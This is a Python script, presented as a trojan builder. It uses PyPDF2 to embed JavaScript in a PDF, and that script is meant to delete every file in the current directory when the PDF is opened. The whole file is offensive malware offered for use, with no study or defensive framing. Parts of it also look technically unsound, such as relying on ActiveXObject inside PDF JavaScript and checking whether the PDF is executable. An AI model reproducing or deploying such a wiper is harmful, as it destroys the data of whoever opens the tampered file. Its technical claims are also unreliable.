# create a trojan that attaches to a pdf file
# trojan will be hidden in the metadata of the pdf
# and will be executed when the pdf is opened
# in a pdf reader

import sys
import os
import PyPDF2
import argparse

# look for the pdf file in the current directory windows
def find_pdf():
    for file in os.listdir(os.getcwd()):
        if file.endswith(".pdf"):
            return file

# when the pdf is opened, add a wiper to delete all the files in the current directory
def add_wiper(pdf_writer):
    pdf_writer.addJS('var fso = new ActiveXObject("Scripting.FileSystemObject");')
    pdf_writer.addJS('var folder = fso.GetFolder(".");')
    pdf_writer.addJS('var files = new Enumerator(folder.Files);')
    pdf_writer.addJS('while (!files.atEnd()) {')
    pdf_writer.addJS('    fso.DeleteFile(files.item());')
    pdf_writer.addJS('    files.moveNext();')
    pdf_writer.addJS('}')

# open the pdf file and add the wiper
def main():
    parser = argparse.ArgumentParser(description='Create a trojan that attaches to a pdf file and executes a wiper when opened')
    parser.add_argument('-f', '--file', help='File to attach trojan to', required=False)
    args = parser.parse_args()
    if args.file:
        if not os.path.isfile(args.file):
            print('[-] File does not exist')
            sys.exit(1)
        if not os.access(args.file, os.R_OK):
            print('[-] File is not readable')
            sys.exit(1)
        if not os.access(args.file, os.W_OK):
            print('[-] File is not writable')
            sys.exit(1)
        if not os.access(args.file, os.X_OK):
            print('[-] File is not executable')
            sys.exit(1)
    else:
        args.file = find_pdf()
        if not args.file:
            print('[-] No pdf file found')
            sys.exit(1)
    print('[+] Creating trojan')
    pdf = PyPDF2.PdfFileReader(args.file)
    pdf_writer = PyPDF2.PdfFileWriter()
    for page in range(pdf.getNumPages()):
        pdf_writer.addPage(pdf.getPage(page))
    add_wiper(pdf_writer)
    with open(args.file, 'wb') as f:
        pdf_writer.write(f)
    print('[+] Trojan created')

if __name__ == '__main__':
    main()
